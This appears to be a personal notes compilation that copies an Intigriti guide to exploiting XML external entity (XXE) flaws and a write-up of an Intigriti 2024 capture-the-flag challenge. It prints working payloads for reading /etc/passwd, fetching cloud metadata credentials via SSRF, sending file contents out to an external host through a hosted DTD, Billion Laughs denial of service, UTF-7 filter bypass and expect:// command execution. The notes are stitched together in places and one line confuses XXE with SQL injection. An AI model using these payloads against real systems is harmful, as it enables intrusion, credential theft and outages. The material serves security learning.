
## What are XML external entity (XXE) injection vulnerabilities?

XML external entity (XXE) injections are a vulnerability class that allows attackers to manipulate XML data with the intent to take advantage of parsers' capabilities. This often results in the attacker being able to induce the vulnerable application component to make outgoing HTTP connections to arbitrary hosts ([server-side request forgery](https://www.intigriti.com/researchers/blog/hacking-tools/ssrf-a-complete-guide-to-exploiting-advanced-ssrf-vulnerabilities)), read internal files, or in severe cases, even gain access to the machine via [remote code execution](https://www.intigriti.com/researchers/blog/hacking-tools/7-ways-to-achieve-remote-code-execution-rce).

--- lot of potential


# XXE: A complete guide to exploiting advanced XXE vulnerabilities 

					by intigriti: 

- XML-based Web Services (SOAP, REST, and RPC APIs that accept and process data in XML format)
    
- Any importing/exporting feature that delivers or accepts data in XML format
    
- RSS/Atom feed processors
    
- Document viewers/converters (any feature that takes in XML-based documents, such as DOCX, XLSX, etc.)
    
- File uploads processing XML (such as SVG image processors)

XXE! Automate or search for it manually? 🤔 ⚡️ An easy quick tip that can land you an XXE: In your proxy interceptor, add a match&replace rule to change content type "application/json" to "text/xml" All you have to do now is look for XML parsing errors 😎

![[Pasted image 20250312235738.png]]

Now that we know what XXE vulnerabilities are and where to find them, let's go over some ways we can exploit them.

## Exploiting simple XXE vulnerabilities

Let's start with understanding XXE vulnerabilities via a vulnerable component. Take a look at the following vulnerable code snippet:

![Simple vulnerable code snippet case featuring an XML external entity (XXE) injection vulnerability](https://www.datocms-assets.com/85623/1741517494-image_1.png?auto=format "Simple vulnerable code snippet case featuring an XML external entity (XXE) injection vulnerability")

		Simple vulnerable code snippet case featuring an XML external entity (XXE) injection vulnerability

Analyzing the snippet above, we can spot a few issues:

- No adequate user input validation
    
- The XML parser supports XML entities (see `LIBXML_NOENT` flag)

- The XML parser is configured to auto-load external DTDs (Document Type Definitions, see `LIBXML_DTDLOAD` flag)
    

These 3 conditions all help facilitate an XXE attack. Sending a malicious payload as shown below, we'd easily be able to load a local file that we specified in our external entity (`xxe`):

```js
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
    <post>
        <post_title>&xxe;</post_title>
        <post_desc>...</post_desc>
    </post>
</data>
```

![[Pasted image 20250313000510.png]]
### XXE to SSRF

Similarly, instead of declaring a path to a local file, we could also include a URL to an arbitrary host to perform [server-side request forgery attacks](https://www.intigriti.com/researchers/blog/hacking-tools/ssrf-a-complete-guide-to-exploiting-advanced-ssrf-vulnerabilities) and fetch the response.

```js
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY ssrf SYSTEM "https://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<data>
    <post>
        <post_title>&ssrf;</post_title>
        <post_desc>...</post_desc>
    </post>
</data>
```

## Exploiting advanced XXE vulnerabilities

### Exploiting XXE with external DTDs

In some cases, you'll come across targets that filter out the `file://` protocol and replace it with a blank value or block it altogether. To bypass this, we can make use of a special feature within XML, a Document Type Definition (DTD).

**A DTD is essentially a file that specifies the entities that we're using in our malicious XML structure.** Now, instead of declaring it locally (just as we did before) and having a security filter remove our `file://` protocol. We can declare our DTD in an external file and bypass the filtering entirely.

Suppose we got the following document type definition (DTD) file hosted on our server:

```js
<!ENTITY % hostname SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; xxe SYSTEM 'http://example.com/?c=%hostname;'>">
%e;
%xxe;
```

We can craft our XXE payload in a way that would make the vulnerable application reach out to our server, load our malicious DTD file, and execute its contents:

```js
<!DOCTYPE data [
  <!ENTITY % xxe SYSTEM "https://example.com/xxe.dtd"> %xxe;
]>
<data>
    <post>
        <post_title>...</post_title>
        <post_desc>...</post_desc>
    </post>
</data>
```

Using this approach, we are no longer required to specify the blocked `file://` protocol to the vulnerable server while still being able to disclose the contents of internal files!

### Exploiting blind XXE with a parameter entity

Some developers attempt to take proactive measures against XXE attacks and try to strip entities from user input. As we know, an XML entity (equivalent of a variable) is declared and used in the following format:

```js
<!DOCTYPE root [
  <!ENTITY name "This text will replace &name; when used">
]>
<root>&name;</root>
```

Filtering out the ampersand symbol (`&`) often seems like a logical thing to do. However, we can easily bypass this by making use of parameter entities instead. Parameter entities are defined with a percentage sign (`<!ENTITY % name "value">`), referenced with the following syntax: `%name;`

And they can only be referenced in the DTD itself, here's an example of an XXE payload using the parameter entity to load an external resource:

```js
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://example.com/"> %xxe;
]>
<root></root>
```


### Exploiting XXE via resource exhaustion ('Billion Laughs' attack)

As we've mentioned before, security misconfigurations in XML parsers can open up new attack vectors and allow us to exploit XXE vulnerabilities. In some cases, when entity expansion limits are unset, we could practically use this to exponentially expand external entities.

Exponential entity expansion, better known as the 'Billion Laughs' attack, takes advantage of recursive entity declarations, resulting in high memory consumption and even system crashes:

```js
<!DOCTYPE root [
  <!ENTITY e "e">
  <!ENTITY e1 "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
  <!ENTITY e2 "&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;">
  <!ENTITY e3 "&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;">
  <!-- ... -->
]>
<root>&e3;</root>
```

and the expansion happens during parsing yet can completely overwhelm server resources.

**TIP! Always adhere to program guidelines when testing for denial of service (DoS) attacks and only when permitted!**

### Exploiting XXE via UTF-7 encoding

You may have noticed this, but in all our XXE payloads we've exclusively only used the UTF-8 encoding. As we've seen before, some filtering rules consist mainly of stripping malicious keywords and syntax symbols.

However, if the parser is configured to accept multiple character encodings, we could essentially send our malicious payload encoded in UTF-7 instead of the UTF-8 character set:

```
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-data+ACA-+AFs-+AAo-+ACA-+ACA-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AAo-+AF0-+AD4-+AAo-+ADw-data+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-post+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-post+AF8-title+AD4-+ACY-xxe+ADs-+ADw-/post+AF8-title+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-post+AF8-desc+AD4-xyz+ADw-/post+AF8-desc+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-/post+AD4-+AAo-+ADw-/data+AD4-
```

**This approach can help us bypass several input validation restrictions, especially systems that filter based on blacklisted keywords to prevent XXE injection attacks.**

**TIP! Remember to include the XML prolog in your payload and set the encoding to "UTF-7"!**

### Escalating XXE to remote code execution

In some cases, it's possible to go beyond reading system files or reaching internal networks. For example, when the Expect PHP module is enabled, we could essentially use the wrapper to [execute system commands](https://www.intigriti.com/researchers/blog/hacking-tools/7-ways-to-achieve-remote-code-execution-rce):


```json
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY exec SYSTEM "expect://whoami">
]>
<data>
    <post>
        <post_title>whoami: &exec;</post_title>
        <post_desc>...</post_desc>
    </post>
</data>
```

This specific PHP module allows developers to interact with processes through PTY. There are several other wrappers that we can use to escalate our initial XXE vulnerability:

- PHP filter wrapper
    
- PHP archive wrapper (PHAR)
    
- ZIP/JAR wrapper (used to read files in archives)
    
- Data
    
- Gopher
    
- FTP
    
- Dict
    

Let's explore some of them in detail.

#### PHP filter wrapper

The PHP filter wrapper is part of the PHP filter extension aimed at helping developers filter, sanitize, **and validate data. We can use this wrapper to read local files (such as PHP source code):**

```js
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file.php">
]>
<data>
    <post>
        <post_title>&xxe;</post_title>
        <post_desc>...</post_desc>
    </post>
</data>
```

**This PHP filter would encode the contents of our PHP file in base64** and return it to us.

#### PHP Archive Wrapper (PHAR)

The PHAR stream wrapper, part of the PHP Archive Wrapper extension, is used to allow developers to access files within a PHAR file (a PHP application or library compiled into one single file). We can use this wrapper to disclose the contents of PHP files inside an internal PHAR file:

```js
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "phar:///path/to/file.phar/internal/file.php">
]>
<data>
    <post>
        <post_title>&xxe;</post_title>
        <post_desc>...</post_desc>
    </post>
</data>
```

example **by copilot**

```js
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "phar:///var/www/html/myapp.phar/src/Config.php">
]>
<data>
    <post>
        <post_title>&xxe;</post_title>
        <post_desc>...</post_desc>
    </post>
</data>

```

This wrapper can also help [trigger insecure deserialization vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/7-ways-to-achieve-remote-code-execution-rce#4-insecure-deserialization-vulnerabilities).

**TIP! Remember that some wrappers are not natively supported and will require extensions/modules to be enabled before they can be used!**

### Second-order XXE injection

~={red}Second-order XXE injections are a more sophisticated variant of XXE attacks where the malicious payload is first stored and later on, retrieved and executed. =~Second-order vulnerabilities are known to be harder to identify and exploit due to the unpredictable and delayed execution.

This is often the case with, for example, importing functionalities. These types of features are often developed to run asynchronously. At first, you provide your malicious input file by uploading it. **Next, your import request will be queued up before a background worker (the vulnerable component) handles your payload.**

A rule of thumb to follow is to ensure you track all XML data flows throughout the entire web application or API, and not just at entry points. ~={green}This methodology will ensure that you also test for potential second-order SQL injection vulnerabilities.=~


report: https://hackerone.com/reports/836877

---

## Automating XXE Exploitation: A Write-Up on Intigriti CTF 2024 BioCorp Challenge

_# Challenge Description

source from: https://osintteam.blog/biocorp-ctf-99a072260842

_BioCorp reached out with concerns about the security of their network. Specifically, they wanted to ensure that any dangerous functionality was properly decoupled from their public-facing website. Our task was to review their system and report any vulnerabilities._

# Initial Exploration

I began my investigation by navigating through the website like a normal user, checking out pages such as **About**, **Contact**, and **Services**. The **Contact** page caught my attention as it contained a feedback form (see the screenshot below).

![](https://miro.medium.com/v2/resize:fit:875/1*rXIUK6wrX91n8fbSp3_keg.png)

									HomePage

After exploring the frontend, I turned my attention to the source code, which was provided as a ZIP file.

## Code Analysis

In the source code, I noticed a **PHP file** named `panel.php` that wasn’t linked anywhere on the website. While the public-facing pages included **About**, **Services**, and **Contact**, this file seemed hidden.

Here’s the first snippet of code from `panel.php` that caught my attention:

```php
$ip_address = $_SERVER['HTTP_X_BIOCORP_VPN'] ?? $_SERVER['REMOTE_ADDR'];  
  
if ($ip_address !== '80.187.61.102') {  
echo "<h1>Access Denied</h1>";  
echo "<p>You do not have permission to access this page.</p>";  
exit;  
}

```

## Identifying the Bypass

From this code, it was clear that access to the **Control Panel** page required an IP address of `80.187.61.102` to be included in the `X-BIOCORP-VPN` header.

I used **Burp Suite** to send a request with the following header:

>X-BIOCORP-VPN: 80.187.61.102

Upon sending the request, I successfully bypassed the restriction and gained access to a **Control Panel** page.

![](https://miro.medium.com/v2/resize:fit:875/0*T3-mHQd6OStrwZ-3)

									Hidden Page

The page displayed data related to **nuclear equipment** and allowed data submission via POST requests.

## Control Panel Functionality

The **Control Panel** displayed XML data about reactor parameters. Here’s the code that handled XML data processing:

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && strpos($_SERVER['CONTENT_TYPE'], 'application/xml') !== false) {  
$xml_data = file_get_contents('php://input');  
$doc = new DOMDocument();  
if (!$doc->loadXML($xml_data, LIBXML_NOENT)) {  
echo "<h1>Invalid XML</h1>";  
exit;  
}  
} else {  
$xml_data = file_get_contents('data/reactor_data.xml');  
$doc = new DOMDocument();  
$doc->loadXML($xml_data, LIBXML_NOENT);  
}  
  
$temperature = $doc->getElementsByTagName('temperature')->item(0)->nodeValue ?? 'Unknown';  
$pressure = $doc->getElementsByTagName('pressure')->item(0)->nodeValue ?? 'Unknown';  
$control_rods = $doc->getElementsByTagName('control_rods')->item(0)->nodeValue ?? 'Unknown';
```

## Exploiting the Vulnerability

The application processed **XML input** from the POST request without sufficient validation, creating the perfect opportunity for an **XML External Entity (XXE)** attack.

To test this vulnerability, I crafted a malicious XML payload:

![[Pasted image 20250417235330.png]]

## Results

I sent the payload to the server and successfully retrieved the contents of the `flag.txt` file. Here’s the flag I found:


To make the process more efficient, we can automate the exploitation with a Python script. Here’s how the script works and its application:

# Automation Script for Exploitation

The following Python script uses the `requests` library to automate the steps required to exploit the XXE vulnerability:

![[Pasted image 20250417235731.png]]

# Output Example

If the script executes successfully, the output might look like this:

```html
Response received:  
<reactor>  
	<status>  
			<temperature>INTIGRITI{FLAG}</temperature>  
			<pressure>2000</pressure>  
			<control_rods>Lowered</control_rods>  
	</status>  
</reactor>
```

---
